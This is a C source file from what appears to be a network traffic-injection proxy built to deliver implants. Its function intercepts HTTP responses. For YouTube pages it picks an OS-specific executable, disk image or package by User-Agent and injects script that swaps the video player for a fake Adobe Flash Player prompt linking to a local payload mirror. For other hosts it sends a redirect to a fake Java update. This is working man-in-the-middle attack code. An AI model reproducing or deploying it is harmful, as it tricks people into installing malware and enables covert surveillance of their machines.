/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
*/

#define _GNU_SOURCE
#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>
#include <bio_replacer.h>
#include <bio_injector.h>

extern int fix_content_lenght(char *header, int len);
/* globals */


/* protos */

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file, char *tag, char *host, char *ip, char *url);

/************************************************/

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char *tag, char *host, char *ip, char *url)
{
   int written, len;
   int attack_success = 0;
   BIO *fbio = NULL;
   char http_header[HTTP_HEADER_LEN];
   char ipa_url[MAX_URL];
   int ret = 0;

   if(strstr(host, "youtube"))
   {
      char *data;
      struct bio_inject_setup bis;
      int inject_len = 0;
      osuser os;
      FILE *fp = NULL;

      *sbio = BIO_new(BIO_s_connect());
      BIO_set_conn_hostname(*sbio, host);
      BIO_set_conn_port(*sbio, "http");

      if (BIO_do_connect(*sbio) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
         return -ENOADDRESS;
      }

      DEBUG_MSG(D_INFO, "Connection html to [%s]", host);
      sanitize_header(request);

      DEBUG_MSG(D_EXCESSIVE, "header: [%s]", request);
      os = search_useragent_os(request);

      if (os != UNKNOWN) {
         char *thefile = NULL;

         if (os == WINDOWS) {
            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.exe", file);            
         } else if (os == OSX) {
            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.dmg", file);
         } else {
            ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.deb", file);
         }

         if (ret == -1)
            DEBUG_MSG(D_ERROR, "Flash melted allocation failed");

         if ((fp = fopen(thefile, "r")) == NULL) {
            os = UNKNOWN;
         } else {
            fclose(fp);
         }

         SAFE_FREE(thefile);
      }

      BIO_puts(*sbio, request);

      written = 0;
      SAFE_CALLOC(data, READ_BUFF_SIZE, sizeof(char));

      DEBUG_MSG(D_INFO, "Reading response");
      LOOP {
         len = BIO_read(*sbio, data + written, sizeof(char));
         if (len <= 0)
            break;

         written += len;
         if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
            break;
      }
      DEBUG_MSG(D_INFO, "Got Header");

      if (os == UNKNOWN) {
	 DEBUG_MSG(D_ERROR, "ERROR: OS detected not supported, cannot attack !!");
	
	 fbio = BIO_new(BIO_f_null());
         inject_len = 0;
      } else if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
         DEBUG_MSG(D_INFO, "Substituting video frame...");
      
         char *html_to_inject = NULL;

         ret = asprintf(&html_to_inject, 
		"\n<script>" \
		"        var adobelocalmirror = '/flashplayer';\n" \
		"        var c = document.createElement('link');\n" \
		"        c.type = 'text/css'; c.rel = 'stylesheet'; c.href = 'http://s.ytimg.com/yts/cssbin/www-player-vfl0RUPb4.css';\n" \
		"        document.getElementsByTagName('head')[0].appendChild(c);\n" \
		"        var player = document.getElementById('player-api'); player.id = 'player-api-x';\n" \
		/*"        if('textContent' in player) { var msg = player.textContent; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
		"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>'"); */
		"        var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n</script>\n");

	 if (ret == -1)
            DEBUG_MSG(D_ERROR, "Injection allocation failed");

	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");

         fbio = BIO_new(BIO_f_inject());
	 bis.search = "<div id=\"player-api\" class=\"player-width player-height off-screen-target watch-content player-api\"></div>";
         bis.inject = html_to_inject;
         bis.inject_len = strlen(html_to_inject);

         BIO_ctrl(fbio, BIO_C_SET_BUF_MEM, 1, &bis);
         BIO_ctrl(fbio, BIO_C_GET_BUF_MEM_PTR, 1, &bis);

         inject_len = bis.inject_len;
         GBL_STATS->inf_files++;

         attack_success = 1;
      } else {
         DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
         DEBUG_MSG(D_DEBUG, "Server reply is:\n%s", data);

         fbio = BIO_new(BIO_f_null());
         inject_len = 0;
      }

      *cbio = BIO_push(fbio, *cbio);
      if (strstr(data, ": gzip")) {
         DEBUG_MSG(D_ERROR, "ERROR: GZIP compression detected, cannot attack !!");
      }

      int data_len = fix_content_lenght(data, inject_len);
      DEBUG_MSG(D_EXCESSIVE, "data: [%s]", data);

      BIO_write(*cbio, data, data_len);
      SAFE_FREE(data);

      if (attack_success == 1)
          DEBUG_MSG(D_INFO, "=> [%s] [%s] Inject Html Flash attack successful", ip, url);

      return ESUCCESS;
   } else {
      /* calculate and replace the IPA_URL in the file */
      snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);

      DEBUG_MSG(D_INFO, "Tag: %s, sending fake upgrade redirect [%s/%s] ", tag, file, "java-map-update.xml");
      snprintf(http_header, HTTP_HEADER_LEN, "HTTP/1.0 302 Found\r\n"
         "Location: %s/java-map-update-%s.xml\r\n"
         "Content-Type: text/html\r\n"
         "Connection: close\r\n"
         "\r\n", ipa_url, file);

      BIO_write(*cbio, http_header, strlen(http_header));
   }

   GBL_STATS->inf_files++;

   DEBUG_MSG(D_INFO, "=> [%s] [%s] Inject Upgrade attack successful", ip, url);

   return ESUCCESS;
}

/* EOF */

// vim:ts=3:expandtab
